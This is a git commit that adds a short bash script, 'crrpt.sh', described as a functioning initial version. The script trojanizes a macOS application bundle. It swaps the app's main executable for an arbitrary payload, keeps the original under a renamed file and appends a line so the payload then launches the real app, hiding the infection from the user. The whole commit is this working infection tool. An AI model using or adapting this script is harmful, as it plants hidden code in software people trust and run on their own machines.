90c5cad64866a42e3be00129acc02a43a8c7fac8
ErikBoesen <me@erikboesen.com>
2018-04-13 23:26:11 -0400

    Add initial functioning script

---
+++ crrpt.sh
@@ -0,0 +1,15 @@
+#!/usr/bin/env bash
+
+payload=$1
+app_root=$2
+info=$app_root/Contents/Info.plist
+macos=$app_root/Contents/MacOS
+binary=$macos/$(ls $macos)
+
+echo "binary: $binary"
+
+mv $binary ${binary}_
+cp $payload $binary
+chmod +x $binary
+
+echo '$(cd $(dirname ${BASH_SOURCE[0]}) && pwd)/$(basename $0)_' >> $binary
